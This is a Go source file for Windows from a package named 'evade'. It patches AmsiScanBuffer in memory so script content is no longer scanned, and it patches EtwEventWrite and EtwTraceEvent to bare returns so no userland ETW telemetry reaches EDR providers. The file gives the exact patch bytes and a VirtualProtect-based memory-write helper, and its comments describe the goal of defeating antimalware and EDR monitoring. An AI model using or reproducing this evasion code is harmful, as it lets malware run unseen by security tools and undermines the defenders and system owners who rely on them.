//go:build windows

package evade

import (
	"fmt"
	"syscall"
	"unsafe"
)

// initWindows applies the userland patches.
func initWindows() []Result {
	var out []Result
	out = append(out, patchAMSI())
	out = append(out, patchETW())
	out = append(out, patchEtwTraceEvent())
	n, err := InitSyscalls()
	if err != nil {
		out = append(out, Result{"syscalls", false, err.Error()})
	} else {
		out = append(out, Result{"syscalls", n > 0, fmt.Sprintf("%d syscall SSNs resolved", n)})
	}
	return out
}

// --- AMSI patch ---
//
// AMSI is the Antimalware Scan Interface. PowerShell, VBA, JScript, VBScript,
// and .NET reflection all route script content through amsi.dll!AmsiScanBuffer.
// Patching it to always return E_INVALIDARG neuters script scanning for the
// life of the process. Original bytes are preserved so the patch can be
// reversed if needed.

const (
	amsiDll         = "amsi.dll"
	amsiScanBuffer  = "AmsiScanBuffer"
	amsiResult      = 0x80070057 // E_INVALIDARG
)

func patchAMSI() Result {
	amsi, err := syscall.LoadLibrary(amsiDll)
	if err != nil {
		return Result{"amsi", false, "load " + amsiDll + ": " + err.Error()}
	}
	defer syscall.FreeLibrary(amsi)

	addr, err := syscall.GetProcAddress(amsi, amsiScanBuffer)
	if err != nil {
		return Result{"amsi", false, "resolve AmsiScanBuffer: " + err.Error()}
	}

	// Patch: mov eax, E_INVALIDARG ; ret  =  B8 57 00 07 80 C3
	// Six bytes. Doesn't need the argument stack because we're returning an
	// error code, not touching the caller's data.
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	if err := writeProcessMemory(addr, patch); err != nil {
		return Result{"amsi", false, "write: " + err.Error()}
	}
	return Result{"amsi", true, "AmsiScanBuffer patched"}
}

// --- ETW patch ---
//
// EtwEventWrite is the entry point for userland ETW writes. EDR products
// register providers and rely on this path. Patching it to a bare ret means
// no events reach the provider, no telemetry leaves the process. Does not
// affect kernel-side ETW (kernel providers still see what they see).

const (
	ntdllDll         = "ntdll.dll"
	etwEventWrite    = "EtwEventWrite"
	etwTraceEvent    = "EtwTraceEvent"
)

func patchETW() Result {
	ntdll, err := syscall.LoadLibrary(ntdllDll)
	if err != nil {
		return Result{"etw", false, "load ntdll: " + err.Error()}
	}
	defer syscall.FreeLibrary(ntdll)

	addr, err := syscall.GetProcAddress(ntdll, etwEventWrite)
	if err != nil {
		return Result{"etw", false, "resolve EtwEventWrite: " + err.Error()}
	}

	// Patch: xor eax, eax ; ret  =  31 C0 C3
	// Returns 0 (STATUS_SUCCESS) without writing any event.
	patch := []byte{0x31, 0xC0, 0xC3}

	if err := writeProcessMemory(addr, patch); err != nil {
		return Result{"etw", false, "write: " + err.Error()}
	}
	return Result{"etw", true, "EtwEventWrite patched"}
}

// EtwTraceEvent is a secondary patch point some EDR products rely on.
func patchEtwTraceEvent() Result {
	ntdll, err := syscall.LoadLibrary(ntdllDll)
	if err != nil {
		return Result{"etw-trace", false, "load ntdll: " + err.Error()}
	}
	defer syscall.FreeLibrary(ntdll)

	addr, err := syscall.GetProcAddress(ntdll, etwTraceEvent)
	if err != nil {
		// Some Windows builds don't export this name. Not fatal.
		return Result{"etw-trace", false, "not exported on this build"}
	}

	patch := []byte{0x31, 0xC0, 0xC3}
	if err := writeProcessMemory(addr, patch); err != nil {
		return Result{"etw-trace", false, "write: " + err.Error()}
	}
	return Result{"etw-trace", true, "EtwTraceEvent patched"}
}

// --- helpers ---

// writeProcessMemory flips a page to RWX, copies, then restores protection.
// Uses VirtualProtect (Kernel32) directly instead of going through Nt* so
// this can work before any unhooking logic runs.
func writeProcessMemory(addr uintptr, patch []byte) error {
	k32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer syscall.FreeLibrary(k32)

	vp, err := syscall.GetProcAddress(k32, "VirtualProtect")
	if err != nil {
		return err
	}
	_ = vp

	var old uint32
	// VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)
	r1, _, e := syscall.Syscall6(vp, 4,
		addr,
		uintptr(len(patch)),
		uintptr(0x40), // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&old)),
		0, 0)
	if r1 == 0 {
		return e
	}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	// restore
	syscall.Syscall6(vp, 4, addr, uintptr(len(patch)), uintptr(old), 0, 0, 0)
	return nil
}
